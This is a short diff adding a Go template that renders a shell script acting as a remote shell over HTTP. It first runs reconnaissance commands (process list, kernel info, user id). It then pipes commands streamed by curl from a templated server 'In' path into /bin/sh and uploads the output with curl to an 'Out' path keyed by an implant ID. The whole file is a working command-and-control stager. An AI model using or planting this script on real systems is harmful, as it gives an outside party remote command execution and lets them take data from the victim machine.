@@ -1,0 +1,11 @@
+{{define "script"}}
+
+#!/bin/sh
+{
+    echo 'ps awwwfux; uname -a; id'
+    exec {{template "curl" .}}/{{.URLPaths.In }}/{{.ID}} -N
+} </dev/null 2>&0 |
+/bin/sh 2>&1 |
+{{template "curl" .}}/{{.URLPaths.Out}}/{{.ID}} -T- >/dev/null 2>&1
+
+{{end}}
